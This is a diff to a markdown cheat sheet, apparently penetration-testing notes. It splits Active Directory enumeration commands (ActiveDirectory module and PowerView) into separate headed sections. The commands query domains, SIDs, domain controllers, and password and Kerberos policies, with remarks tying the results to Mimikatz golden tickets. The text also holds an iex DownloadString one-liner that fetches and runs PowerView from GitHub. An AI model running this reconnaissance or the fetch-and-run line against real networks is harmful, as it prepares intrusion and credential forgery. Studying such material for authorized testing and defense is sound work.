@@ -29,22 +29,33 @@ Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1
 Get-Command -Module ActiveDirectory
 ```
 
-### Commands
+### Get current Domain
 
 ```powershell
-# Get current domain
 Get-ADDomain
+```
 
-# Get object of another domain
+### Get Object of another Domain
+
+```powershell
 Get-ADDomain -Identity lab.local
+```
 
-# Get domain SID for current domain
+### Get Domain SID for current Domain
+
+```powershell
 (Get-ADDomain).DomainSID
+```
 
-# Get domain controllers for current domain
+### Get Domain Controllers for current Domain
+
+```powershell
 Get-ADDomainController
+```
 
-# Get domain controllers for another domain
+### Get Domain Controllers for another Domain
+
+```powershell
 Get-ADDomainController -DomainName lab.local -Discover
 ```
 
@@ -64,46 +75,77 @@ Import-Module .\PowerView.ps1
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
 ```
 
-### Commands
+### Get current Domain
 
 ```powershell
-# Get current domain
 Get-NetDomain
+```
 
-# Get object of another domain
+### Get Object of another Domain
+
+```powershell
 Get-NetDomain -Domain lab.local
+```
 
-# Get domain SID for current domain
+### Get Domain SID for current Domain
+
+```powershell
 Get-DomainSID
+```
 
-# Get domain policy for current domain
+### Get Domain Policy for current Domain
+
+```powershell
 Get-DomainPolicy
 (Get-DomainPolicy)."System Access"
+```
 
-# Get domain policy for another domain
-# Password policy
+### Get Password Policy for another Domain
+
+```powershell
 (Get-DomainPolicy -Domain lab.local)."System Access"
+```
 
-# Kerberos policy for e.g. mimikatz golden tickets
+### Get Kerberos Policy for e.g. Mimikatz Golden Tickets
+
+```powershell
 (Get-DomainPolicy -Domain lab.local)."Kerberos Policy"
+```
 
-# Get domain controllers for current domain
+### Get Domain Controllers for current Domain
+
+```powershell
 Get-NetDomainController
+```
 
-# Get domain controllers for another domain
+### Get Domain Controllers for another Domain
+
+```powershell
 Get-NetDomainController -Domain lab.local
+```
 
-# enumerate all gobal catalogs in the forest
+### Enumerate all Gobal Catalogs in the Forest
+
+```powershell
 Get-ForestGlobalCatalog
+```
 
-# Turn a list of computer short names to FQDNs, using a global catalog
+### Turn a List of Computer Short Names to FQDNs, using a Global Catalog
+
+```powershell
 gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}
+```
 
-# Enumerate the current domain controller policy
+### Enumerate the current Domain Controller Policy
+
+```powershell
 $DCPolicy = Get-DomainPolicy -Policy DC
 $DCPolicy.PrivilegeRights # user privilege rights on the dc...
+```
 
-# Enumerate the current domain policy
+### Enumerate the current Domain Policy
+
+```powershell
 $DomainPolicy = Get-DomainPolicy -Domain bufu-sec.local
 $DomainPolicy.KerberosPolicy # useful for golden tickets ;)
 $DomainPolicy.SystemAccess # password age/etc.
